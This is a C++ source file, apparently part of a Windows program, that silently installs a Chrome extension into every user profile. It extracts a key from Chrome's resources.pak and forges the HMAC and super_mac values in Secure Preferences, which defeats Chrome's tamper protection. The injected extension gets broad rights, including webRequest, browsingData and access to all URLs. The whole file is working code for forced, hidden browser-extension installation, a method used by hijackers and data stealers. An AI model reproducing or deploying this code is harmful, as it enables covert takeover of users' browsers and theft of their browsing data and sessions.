#include "stdafx.h"
#include "extensionManage.h"
#include "crypto.hpp"

using json = nlohmann::json;

// Global variables for extensions install
vector<WCHAR*> g_vecChromeProfilePath;
WCHAR g_szExtensionPath[MAX_PATH];

// ############################# Manage Chrome Extensions ###################################
bool createExtensionsPath(const char* szName)
{
	char destinationPath[MAX_PATH];
	ExpandEnvironmentStringsA("%APPDATA%\\EdgeCookie\\x86\\Extensions\\", destinationPath, MAX_PATH);
	strcat_s(destinationPath, szName);
	CreateDirectoryRecursively(destinationPath);
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, destinationPath, strlen(destinationPath), g_szExtensionPath, MAX_PATH);
	return true;
}

bool unzipToCorePath(const char* zipfilePath)
{
	char szUnzippedPath[MAX_PATH];
	char zipfilePathExpand[MAX_PATH];
	ExpandEnvironmentStringsA("%TEMP%\\tempExtensions", szUnzippedPath, MAX_PATH);
	ExpandEnvironmentStringsA(zipfilePath, zipfilePathExpand, MAX_PATH);
	CreateDirectoryRecursively(szUnzippedPath);

	if (!extractZipFile(zipfilePathExpand, szUnzippedPath))
	{
		return false;
	}

	char szMainfestFilePath[MAX_PATH];
	strcpy_s(szMainfestFilePath, szUnzippedPath);
	strcat_s(szMainfestFilePath, "\\manifest.json");

	std::fstream mainfestFile(szMainfestFilePath);
	Json::Reader reader;
	Json::Value mainfestObj;
	reader.parse(mainfestFile, mainfestObj);

	string szExtensionName = mainfestObj["name"].asString();

	if (!createExtensionsPath(szExtensionName.c_str()))
	{
		return false;
	}

	WCHAR removeTempDir[MAX_PATH];
	ExpandEnvironmentStringsW(L"%TEMP%\\tempExtensions", removeTempDir, MAX_PATH);
	DeleteDirectory(removeTempDir, true);

	int size = WideCharToMultiByte(CP_UTF8, 0, g_szExtensionPath, -1, NULL, 0, NULL, NULL);
	char* szExtensionPath = new char[size];
	WideCharToMultiByte(CP_UTF8, 0, g_szExtensionPath, -1, szExtensionPath, size, NULL, NULL);

	if (!extractZipFile(zipfilePathExpand, szExtensionPath))
	{
		return false;
	}

	return true;
}

void getKey(unsigned char* ptrKey)
{
	TCHAR szChromePath[MAX_PATH];

	//////////////////////////
	TCHAR szPath[MAX_PATH];

	if (FAILED(SHGetFolderPath(NULL,
		CSIDL_LOCAL_APPDATA | CSIDL_FLAG_CREATE,
		NULL,
		0,
		szPath)))
	{
		return;
	}

	_tcscat_s(szPath, MAX_PATH, _T("\\Google\\Chrome\\Application\\"));

	/////////////////////////

	if (dirExists(_T("C:\\Program Files (x86)\\Google\\Chrome\\Application\\")))
		_tcscpy(szChromePath, _T("C:\\Program Files (x86)\\Google\\Chrome\\Application\\"));
	else if (dirExists(_T("C:\\Program Files\\Google\\Chrome\\Application\\")))
		_tcscpy(szChromePath, _T("C:\\Program Files\\Google\\Chrome\\Application\\"));
	else if (dirExists(szPath))
		_tcscpy(szChromePath, szPath);
	else
		return;

	TCHAR szFindPath[MAX_PATH] = { 0 };
	_tcscpy(szFindPath, szChromePath);
	_tcscat(szFindPath, _T("*"));

	WIN32_FIND_DATA file;
	HANDLE search_handle = FindFirstFile(szFindPath, &file);
	BOOL isFinded = FALSE;
	if (search_handle)
	{
		do
		{
			if (file.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
			{
				if (file.cFileName[0] >= L'0' && file.cFileName[0] <= L'9')
				{
					isFinded = TRUE;
					break;
				}
			}
		} while (FindNextFile(search_handle, &file));

		FindClose(search_handle);
	}

	if (isFinded != TRUE)
		return;

	_tcscpy(szFindPath, szChromePath);
	_tcscat(szFindPath, file.cFileName);
	_tcscat(szFindPath, _T("\\resources.pak"));

	DWORD version;
	DWORD encoding;
	WORD resource_count;
	WORD alias_count;
	DWORD header_size;

	SYSTEM_INFO sysinfo = { 0 };
	::GetSystemInfo(&sysinfo);
	DWORD cbView = sysinfo.dwAllocationGranularity;

	HANDLE hfile = ::CreateFile(szFindPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile != INVALID_HANDLE_VALUE)
	{
		DWORD file_size = 0;
		::GetFileSize(hfile, &file_size);

		HANDLE hmap = ::CreateFileMappingW(hfile, NULL, PAGE_READONLY, 0, 0, NULL);
		if (hmap != NULL)
		{
			unsigned char* pView = static_cast<unsigned char*>(
				::MapViewOfFile(hmap, FILE_MAP_READ, 0, 0, file_size));

			if (pView != NULL)
			{
				unsigned char* pCurPos = pView;

				version = *((DWORD*)pCurPos);
				pCurPos += 4;
				if (version == 4)
				{
					resource_count = *((DWORD*)pCurPos);
					pCurPos += 4;
					encoding = *(pCurPos);
					pCurPos++;
					header_size = 9;
				}
				else if (version == 5)
				{
					encoding = *((DWORD*)pCurPos);
					pCurPos += 4;
					resource_count = *((WORD*)pCurPos);
					pCurPos += 2;
					alias_count = *((WORD*)pCurPos);
					pCurPos += 2;
					header_size = 12;
				}
				else
				{
					::CloseHandle(hmap);
					::CloseHandle(hfile);
					return;
				}

				DWORD kIndexEntrySize = 2 + 4;

				WORD wPrevID = *((WORD*)pCurPos);
				DWORD dwPrevOffset = *((DWORD*)(pCurPos + 2));
				pCurPos += 6;

				BOOL findKey = FALSE;

				for (WORD i = 1; i < resource_count; i++)
				{
					WORD wID = *((WORD*)pCurPos);
					DWORD dwOffset = *((DWORD*)(pCurPos + 2));

					if (dwOffset - dwPrevOffset == 64)
					{
						memcpy(ptrKey, pView + dwPrevOffset, 64);
						findKey = TRUE;
						break;
					}

					dwPrevOffset = dwOffset;
					wPrevID = wID;

					pCurPos += 6;
				}
			}
			::CloseHandle(hmap);
		}
		::CloseHandle(hfile);
	}
}

std::string getExtensionID(const WCHAR* pwszPath)
{
	// SHA256 of wide-string bytes using Windows BCrypt (SimpleWeb::Crypto)
	size_t len = lstrlenW(pwszPath) * sizeof(WCHAR);
	std::string input((const char*)pwszPath, len);
	std::string hash = SimpleWeb::Crypto::sha256(input);
	if (hash.size() != 32) return std::string();

	// Convert 32-byte hash to 64-char hex
	char outputBuffer[65];
	for (int i = 0; i < 32; i++)
		sprintf(outputBuffer + (i * 2), "%02x", (unsigned char)hash[i]);
	outputBuffer[64] = 0;

	string ret;
	for (int i = 0; i < 32; i++)
	{
		if (outputBuffer[i] > 0x2F && outputBuffer[i] < 0x3A)
			ret += ('a' + (outputBuffer[i] - 0x30));
		else
			ret += ('a' + (outputBuffer[i] - 0x57));
	}

	return ret;
}

bool getChromeProfilePaths()
{
	g_vecChromeProfilePath.clear();
	WCHAR szPath[MAX_PATH];
	WCHAR szSearchProfilePath[MAX_PATH];
	WCHAR szChromeUserDataPath[MAX_PATH];

	WIN32_FIND_DATAW FindDirData;
	HANDLE hFind;

	if (FAILED(SHGetFolderPathW(NULL,
		CSIDL_LOCAL_APPDATA | CSIDL_FLAG_CREATE,
		NULL,
		0,
		szPath)))
	{
		return false;
	}

	if (szPath[wcslen(szPath) - 1] == _T('\\'))
		szPath[wcslen(szPath) - 1] = 0;

	wcscpy_s(szSearchProfilePath, MAX_PATH, szPath);
	wcscat_s(szSearchProfilePath, MAX_PATH, L"\\Google\\Chrome\\User Data\\Profile *");

	wcscpy_s(szChromeUserDataPath, MAX_PATH, szPath);
	wcscat_s(szChromeUserDataPath, MAX_PATH, L"\\Google\\Chrome\\User Data\\");

	WCHAR* szDefaultProfilePath = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR));
	wcscpy_s(szDefaultProfilePath, MAX_PATH, szPath);
	wcscat_s(szDefaultProfilePath, MAX_PATH, L"\\Google\\Chrome\\User Data\\Default");

	g_vecChromeProfilePath.push_back(szDefaultProfilePath);

	hFind = FindFirstFileW(szSearchProfilePath, &FindDirData);
	do
	{
		if (FindDirData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			WCHAR* szProfilePath = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR));
			wcscpy_s(szProfilePath, MAX_PATH, szChromeUserDataPath);
			wcscat_s(szProfilePath, MAX_PATH, FindDirData.cFileName);
			g_vecChromeProfilePath.push_back(szProfilePath);
		}
	} while (FindNextFileW(hFind, &FindDirData) != 0);

	FindClose(hFind);

	return true;
}

bool installExtension(const char* zipfilePath)
{
	json d;
	json sec;
	json secureJSON;

	// Unzip to EdgeCookie/Extensions/ExtensionName folder
	if (!unzipToCorePath(zipfilePath))
	{
		return false;
	}

	unsigned char key[64];
	getKey(key);

	string extension_name = getExtensionID(g_szExtensionPath);

	char szExtPath[MAX_PATH];
	wcstombs(szExtPath, g_szExtensionPath, MAX_PATH);

	char szSecureJsonPath[MAX_PATH];
	strcpy_s(szSecureJsonPath, szExtPath);
	strcat_s(szSecureJsonPath, "\\secure.json");
	
	std::fstream secureJsonFile(szSecureJsonPath);
	secureJsonFile >> secureJSON;

	if (!getChromeProfilePaths())
	{
		return false;
	}

	// Install Extension to All Profiles
	for (unsigned int i = 0; i < g_vecChromeProfilePath.size(); i++)
	{
		char szFilePath[MAX_PATH];
		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Preferences");
		std::fstream preFile(szFilePath);

		preFile >> d;

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Secure Preferences");
		std::fstream secPreFile(szFilePath);

		secPreFile >> sec;

		if (d["extensions"].find("install_signature") == d["extensions"].end())
		{
			d["extensions"]["install_signature"] = json({});
			d["extensions"]["install_signature"]["ids"] = json(extension_name.c_str());
		}
		else
		{
			if (d["extensions"]["install_signature"]["ids"].find(extension_name.c_str()) == d["extensions"]["install_signature"]["ids"].end())
			{
				if (d["extensions"]["install_signature"]["ids"].is_array())
				{
					d["extensions"]["install_signature"]["ids"].push_back(extension_name.c_str());
				}
			}
		}

		// string extension_json1 = "{\"active_permissions\":{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]},\"creation_flags\":38,\"from_bookmark\":false,\"from_webstore\":false,\"granted_permissions\":{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]},\"install_time\":\"13188169127141243\",\"location\":4,\"never_activated_since_loaded\":true,\"newAllowFileAccess\":true,\"path\":";
		// string extension_json2 = ",\"serviceworkerevents\":[\"action.onClicked\"],\"state\":1,\"was_installed_by_default\":false,\"was_installed_by_oem\":false}";
		// string ext_path = szExtPath;
		// string extension_json = extension_json1 + "\"" + string_replace(ext_path, "\\", "\\\\") + "\"" + extension_json2;

		secureJSON["path"] = json(szExtPath);
		string extension_json = secureJSON.dump();
		extension_json = string_replace(extension_json, "<", "\\u003C");

		if (sec.find("extensions") == sec.end())
			sec["extensions"] = json({});

		if (sec["extensions"].find("settings") == sec["extensions"].end())
			sec["extensions"]["settings"] = json({});

		// json j = json::parse(extension_json.c_str());

		sec["extensions"]["settings"][extension_name.c_str()] = secureJSON;

		if (d["extensions"].find("toolbar") == d["extensions"].end())
		{
			d["extensions"]["toolbar"] = json(extension_name.c_str());
		}
		else
		{
			if (d["extensions"]["toolbar"].find(extension_name.c_str()) == d["extensions"]["toolbar"].end())
			{
				if (d["extensions"]["toolbar"].is_array())
				{
					d["extensions"]["toolbar"].push_back(extension_name.c_str());
				}
			}
		}

		WCHAR tszSID[100];

		getStringSID(tszSID);

		WCHAR szBuffer[MAX_PATH];
		GetSystemDirectoryW(szBuffer, MAX_PATH);
		szBuffer[3] = 0;

		WCHAR volumeName[MAX_PATH + 1] = { 0 };
		WCHAR fileSystemName[MAX_PATH + 1] = { 0 };
		DWORD serialNumber = 0;
		DWORD maxComponentLen = 0;
		DWORD fileSystemFlags = 0;

		if (GetVolumeInformationW(
			szBuffer,
			volumeName,
			sizeof(volumeName),
			&serialNumber,
			&maxComponentLen,
			&fileSystemFlags,
			fileSystemName,
			sizeof(fileSystemName)) != TRUE)
			return false;

		char szSID[100];
		wcstombs(szSID, tszSID, 100);

		string message;
		{
			message = szSID;
			message += "extensions.settings.";
			message += extension_name;
			message += extension_json;

			string hash = getHMACSHA256(key, message.c_str());

			if (sec.find("protection") == sec.end())
			{
				sec["protection"] = json({});
				sec["protection"]["macs"] = json({});
				if (sec["protection"]["macs"].find("extensions") == sec["protection"]["macs"].end())
				{
					sec["protection"]["macs"]["extensions"] = json({});
					sec["protection"]["macs"]["extensions"]["settings"] = json({});
				}
			}
			else
			{
				if (sec["protection"].find("macs") == sec["protection"].end())
					sec["protection"]["macs"] = json({});

				if (sec["protection"]["macs"].find("extensions") == sec["protection"]["macs"].end())
					sec["protection"]["macs"]["extensions"] = json({});

				if (sec["protection"]["macs"]["extensions"].find("settings") == sec["protection"]["macs"]["extensions"].end())
					sec["protection"]["macs"]["extensions"]["settings"] = json({});
			}

			sec["protection"]["macs"]["extensions"]["settings"][extension_name.c_str()] = json(hash.c_str());
		}

		string _str = sec["protection"]["macs"].dump();

		message = szSID + _str;
		string supermac = getHMACSHA256(key, message.c_str());
		sec["protection"]["super_mac"] = json(supermac.c_str());

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Preferences");
		std::ofstream outPreFile(szFilePath);
		outPreFile << d;

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Secure Preferences");
		std::ofstream outSecPreFile(szFilePath);
		outSecPreFile << sec;
	}

	return true;
}

bool getExtensionsPath(const char* szName)
{
	char destinationPath[MAX_PATH];
	ExpandEnvironmentStringsA("%APPDATA%\\EdgeCookie\\x86\\Extensions\\", destinationPath, MAX_PATH);
	strcat_s(destinationPath, szName);
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, destinationPath, strlen(destinationPath), g_szExtensionPath, MAX_PATH);

	if (dirExists(destinationPath))
		return true;

	return false;
}

bool uninstallExtension(std::string name)
{
	json d;
	json sec;

	if (!getExtensionsPath(name.c_str()))
	{
		return false;
	}

	if (!getChromeProfilePaths())
	{
		return false;
	}

	unsigned char key[64];
	getKey(key);

	string extension_name = getExtensionID(g_szExtensionPath);

	char szExtPath[MAX_PATH];
	wcstombs(szExtPath, g_szExtensionPath, MAX_PATH);

	for (unsigned int i = 0; i < g_vecChromeProfilePath.size(); i++)
	{
		char szFilePath[MAX_PATH];
		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Preferences");
		std::fstream preFile(szFilePath);

		preFile >> d;

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Secure Preferences");
		std::fstream secPreFile(szFilePath);

		secPreFile >> sec;

		if (d["extensions"].find("install_signature") != d["extensions"].end())
		{
			if (d["extensions"]["install_signature"]["ids"].find(extension_name) != d["extensions"]["install_signature"]["ids"].end())
			{
				d["extensions"]["install_signature"]["ids"].erase(d["extensions"]["install_signature"]["ids"].find(extension_name));
			}
		}

		string extension_json1 = "{\"active_permissions\":{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]},\"creation_flags\":38,\"from_bookmark\":false,\"from_webstore\":false,\"granted_permissions\":{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]},\"install_time\":\"13188169127141243\",\"location\":4,\"never_activated_since_loaded\":true,\"newAllowFileAccess\":true,\"path\":";
		string extension_json2 = ",\"serviceworkerevents\":[\"action.onClicked\"],\"state\":1,\"was_installed_by_default\":false,\"was_installed_by_oem\":false}";
		string ext_path = szExtPath;
		string extension_json = extension_json1 + "\"" + string_replace(ext_path, "\\", "\\\\") + "\"" + extension_json2;

		if (sec.find("extensions") != sec.end())
		{
			if (sec["extensions"].find("settings") != sec["extensions"].end())
			{
				if (sec["extensions"]["settings"].find(extension_name) != sec["extensions"]["settings"].end())
				{
					sec["extensions"]["settings"].erase(sec["extensions"]["settings"].find(extension_name));
				}
			}
		}

		if (d["extensions"].find("toolbar") != d["extensions"].end())
		{
			if (d["extensions"]["toolbar"].find(extension_name) != d["extensions"]["toolbar"].end())
			{
				d["extensions"]["toolbar"].erase(d["extensions"]["toolbar"].find(extension_name));
			}
		}

		WCHAR tszSID[100];

		getStringSID(tszSID);

		WCHAR szBuffer[MAX_PATH];
		GetSystemDirectoryW(szBuffer, MAX_PATH);
		szBuffer[3] = 0;

		WCHAR volumeName[MAX_PATH + 1] = { 0 };
		WCHAR fileSystemName[MAX_PATH + 1] = { 0 };
		DWORD serialNumber = 0;
		DWORD maxComponentLen = 0;
		DWORD fileSystemFlags = 0;

		if (GetVolumeInformationW(
			szBuffer,
			volumeName,
			sizeof(volumeName),
			&serialNumber,
			&maxComponentLen,
			&fileSystemFlags,
			fileSystemName,
			sizeof(fileSystemName)) != TRUE)
			return false;

		char szSID[100];
		wcstombs(szSID, tszSID, 100);

		string message;
		{
			message = szSID;
			message += "extensions.settings.";
			message += extension_name;
			message += extension_json;

			string hash = getHMACSHA256(key, message.c_str());

			if (sec.find("protection") != sec.end())
			{
				if (sec["protection"].find("macs") != sec["protection"].end())
				{
					if (sec["protection"]["macs"].find("extensions") != sec["protection"]["macs"].end())
					{
						if (sec["protection"]["macs"]["extensions"].find("settings") != sec["protection"]["macs"]["extensions"].end())
						{
							if (sec["protection"]["macs"]["extensions"]["settings"].find(extension_name.c_str()) != sec["protection"]["macs"]["extensions"]["settings"].end())
							{
								sec["protection"]["macs"]["extensions"]["settings"].erase(sec["protection"]["macs"]["extensions"]["settings"].find(extension_name.c_str()));

								string _str = sec["protection"]["macs"].dump();

								message = szSID + _str;
								string supermac = getHMACSHA256(key, message.c_str());
								sec["protection"]["super_mac"] = json(supermac.c_str());
							}
						}
					}
				}
			}
		}

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Preferences");
		std::ofstream outPreFile(szFilePath);
		outPreFile << d;

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Secure Preferences");
		std::ofstream outSecPreFile(szFilePath);
		outSecPreFile << sec;
	}

	DeleteDirectory(g_szExtensionPath, true);

	return true;
}
